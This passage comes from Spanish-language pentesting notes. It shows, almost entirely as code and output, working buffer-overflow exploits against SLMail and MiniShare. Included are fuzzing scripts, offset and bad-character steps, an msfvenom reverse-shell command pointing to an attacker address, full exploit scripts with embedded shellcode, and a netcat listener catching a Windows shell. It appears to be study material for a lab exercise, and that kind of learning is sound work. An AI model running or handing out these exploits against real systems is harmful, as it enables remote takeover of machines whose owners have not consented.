b"\x20\xc5\x09\xfb\xfd\x8c\xb3\x66\xfe\x7b\xf7\x9e\x7d\x89"
b"\x88\x64\x9d\xf8\x8d\x21\x19\x11\xfc\x3a\xcc\x15\x53\x3a"
b"\xc5")


payload = before_eip + eip + b"\x83\xEC\x10" + shellcode

def exploit():

    # Create a socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    #Receive the banner
    banner = s.recv(1024)
    
    s.send(b"USER Metahumo" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```


Ganamos acceso a la máquina que corre el servicio SLMail explotando un BOF

---

## Uso del Payload `windows/exec` en Explotación con Buffer Overflow

Además de otros payloads ya vistos, podemos utilizar `windows/exec` para ejecutar directamente un comando en la máquina víctima. Este payload de Metasploit permite especificar un comando arbitrario mediante la variable `CMD`.

### ¿Cómo se utiliza?

Se genera el shellcode con `msfvenom` usando:

```bash
msfvenom -p windows/exec CMD="<comando>" -f <formato> [opciones]
````

Esto crea un shellcode que, al ser interpretado, ejecutará el comando indicado en `CMD`.

### Integración con Buffer Overflow

Una vez generado el shellcode, podemos integrarlo en un exploit de buffer overflow. Tras sobrescribir el registro `EIP` y redirigir el flujo de ejecución al shellcode, este ejecutará el comando directamente.

### Ejemplo

```bash
msfvenom -p windows/exec CMD="calc.exe" -f c
```

Este comando genera un shellcode que abrirá la calculadora al ser ejecutado.


Esta técnica es útil para realizar acciones rápidas sobre la máquina objetivo sin necesidad de establecer una reverse shell.

---

## script secuencia con bucle inicial fuzzing

```python
#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.1.65"
port = 80

def exploit():

    total_length = 100

    while True:
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(7)

            s.connect((ip_address, port))

            print("\n[+] Enviando %d bytes" % total_length)

            s.send(b"GET " + b"\x41"*total_length + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()

            total_length += 100
        except:
            print("\n[!] El servicio se ha corrompido\n")
            print("\n[i] El servicio ha crasheado con un total de %d bytes" % total_length)
            sys.exit(1)

if __name__ == '__main__':
    exploit()
```

Resultado: 

```bash
[+] Enviando 100 bytes

[+] Enviando 200 bytes

[+] Enviando 300 bytes

...

[+] Enviando 1800 bytes

[!] El servicio se ha corrompido
```

```python
#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.1.65"
port = 80

payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9'

def exploit():

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(7)

            s.connect((ip_address, port))


            s.send(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()
        except:
            print("\n[!] El servicio se ha corrompido\n")
            sys.exit(1)

if __name__ == '__main__':
    exploit()
```

Acción: con el EIP en [Immunity Debugger](Immunity%20Debugger.md) `36684335`

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x36684335
```

Resultado:

```bash
[*] Exact match at offset 1787
```

```python
#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.1.65"
port = 80

offset = 1787

before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip

def exploit():

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(7)

            s.connect((ip_address, port))


            s.send(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()
        except:
            print("\n[!] El servicio se ha corrompido\n")
            sys.exit(1)

if __name__ == '__main__':
    exploit()
```


```python
#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.1.65"
port = 80

offset = 1787

before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip + b"C"*500

def exploit():

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(7)

            s.connect((ip_address, port))


            s.send(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()
        except:
            print("\n[!] El servicio se ha corrompido\n")
            sys.exit(1)

if __name__ == '__main__':
    exploit()
```

```immunity debugger
!mona bytearray -cpb "\x00"
```

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

```url
\\ip_atacante\
```

```python
#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.1.65"
port = 80

offset = 1787

before_eip = b"A"*offset
eip = b"B"*4

badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + badchars

def exploit():

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(7)

            s.connect((ip_address, port))


            s.send(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()
        except:
            print("\n[!] El servicio se ha corrompido\n")
            sys.exit(1)

if __name__ == '__main__':
    exploit()
```

```immunity debugger
!mona compare -a 0x035838D0 -f C:\Users\vbouser\Desktop\Analysis\bytearray.bin
```

Resultado:

```txt
\x00 y \x0d
```

```python
El mismo que antes pero quitando \x0d
```

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.66 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0d' EXITFUNC=thread
```

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

Resultado:

```bash
nasm > jmp ESP
00000000  FFE4              jmp esp
```

```Immunyty Debugger
!mona modules
```

```Immunyty Debugger
!mona find -s "\xFF\xE4" -m minishare.exe
```

**Nota:** como no nos sale nada probamos otro comando

```Immunyty Debugger
!mona findwild -s "JMP ESP"
```

Resultado: obtenemos la dirección `756349f3` (por ejemplo)

```python
#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.1.65"
port = 80

offset = 1787

before_eip = b"A"*offset
eip = pack("<L", 0x756349f3)

shellcode = (b"\xdb\xc3\xd9\x74\x24\xf4\x5a\xbe\xb7\x73\xc9\x3d\x29\xc9"
b"\xb1\x52\x31\x72\x17\x03\x72\x17\x83\x5d\x8f\x2b\xc8\x5d"
b"\x98\x2e\x33\x9d\x59\x4f\xbd\x78\x68\x4f\xd9\x09\xdb\x7f"
b"\xa9\x5f\xd0\xf4\xff\x4b\x63\x78\x28\x7c\xc4\x37\x0e\xb3"
b"\xd5\x64\x72\xd2\x55\x77\xa7\x34\x67\xb8\xba\x35\xa0\xa5"
b"\x37\x67\x79\xa1\xea\x97\x0e\xff\x36\x1c\x5c\x11\x3f\xc1"
b"\x15\x10\x6e\x54\x2d\x4b\xb0\x57\xe2\xe7\xf9\x4f\xe7\xc2"
b"\xb0\xe4\xd3\xb9\x42\x2c\x2a\x41\xe8\x11\x82\xb0\xf0\x56"
b"\x25\x2b\x87\xae\x55\xd6\x90\x75\x27\x0c\x14\x6d\x8f\xc7"
b"\x8e\x49\x31\x0b\x48\x1a\x3d\xe0\x1e\x44\x22\xf7\xf3\xff"
b"\x5e\x7c\xf2\x2f\xd7\xc6\xd1\xeb\xb3\x9d\x78\xaa\x19\x73"
b"\x84\xac\xc1\x2c\x20\xa7\xec\x39\x59\xea\x78\x8d\x50\x14"
b"\x79\x99\xe3\x67\x4b\x06\x58\xef\xe7\xcf\x46\xe8\x08\xfa"
b"\x3f\x66\xf7\x05\x40\xaf\x3c\x51\x10\xc7\x95\xda\xfb\x17"
b"\x19\x0f\xab\x47\xb5\xe0\x0c\x37\x75\x51\xe5\x5d\x7a\x8e"
b"\x15\x5e\x50\xa7\xbc\xa5\x33\x08\xe8\xa4\x81\xe0\xeb\xa6"
b"\x04\x4a\x62\x40\x6c\xbc\x23\xdb\x19\x25\x6e\x97\xb8\xaa"
b"\xa4\xd2\xfb\x21\x4b\x23\xb5\xc1\x26\x37\x22\x22\x7d\x65"
b"\xe5\x3d\xab\x01\x69\xaf\x30\xd1\xe4\xcc\xee\x86\xa1\x23"
b"\xe7\x42\x5c\x1d\x51\x70\x9d\xfb\x9a\x30\x7a\x38\x24\xb9"
b"\x0f\x04\x02\xa9\xc9\x85\x0e\x9d\x85\xd3\xd8\x4b\x60\x8a"
b"\xaa\x25\x3a\x61\x65\xa1\xbb\x49\xb6\xb7\xc3\x87\x40\x57"
b"\x75\x7e\x15\x68\xba\x16\x91\x11\xa6\x86\x5e\xc8\x62\xa6"
b"\xbc\xd8\x9e\x4f\x19\x89\x22\x12\x9a\x64\x60\x2b\x19\x8c"
b"\x19\xc8\x01\xe5\x1c\x94\x85\x16\x6d\x85\x63\x18\xc2\xa6"
b"\xa1")

payload = before_eip + eip + b"\x90"*16 + shellcode

def exploit():

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(7)

            s.connect((ip_address, port))

            s.send(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()
        except:
            print("\n[!] El servicio se ha corrompido\n")
            sys.exit(1)

if __name__ == '__main__':
    exploit()
```

```bash
rlwrap nc -lvnp 443
```

Resultado:

```bash
listening on [any] 443 ...
connect to [192.168.1.66] from (UNKNOWN) [192.168.1.65] 49286
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Program Files\MiniShare>
```

---
